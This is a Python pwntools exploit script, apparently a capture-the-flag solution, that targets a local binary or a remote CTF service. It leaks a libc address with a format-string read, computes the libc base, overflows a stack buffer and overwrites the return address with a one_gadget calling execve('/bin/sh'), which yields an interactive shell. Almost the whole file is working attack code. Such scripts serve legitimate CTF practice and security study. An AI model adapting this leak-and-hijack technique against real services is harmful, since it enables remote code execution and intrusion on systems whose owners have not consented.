from pwn import *
from re import findall

io = None

if args.LOCAL:
    io = process('./deploy/service/task.elf')
else:
    io = remote('ctf.li2sites.ru', 21008)


__LIBC_START_MAIN_RET_OFFSET = 0x270b3
OG1 = 0xe6c7e # execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
OG2 = 0xe6c81 # execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
OG3 = 0xe6c84 # execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

print("[.] using one_gadget")

# ============================= leak executable base =============================
io.recvuntil(b'?\n')

io.sendline('%13$p') # pre-calculated stack index of __libc_start_main_ret

tmp = io.recvline().decode()
tmp = findall("(?<=0x)[a-f0-9A-F]{8,}", tmp)[0]
leak = int(tmp, 16)
libc_base = leak - __LIBC_START_MAIN_RET_OFFSET
print(f'[*] Libc base leaked: {hex(libc_base)}')
# ================================================================================

payload = b'A' * 32 + b'B' * 8 # overflow the buffer and saved RBP

# ================================ one_gadget ====================================
# 2nd one_gadget works without any preparations, others not.
payload += p64(OG2 + libc_base)
# ================================================================================

io.sendline(payload)
io.interactive()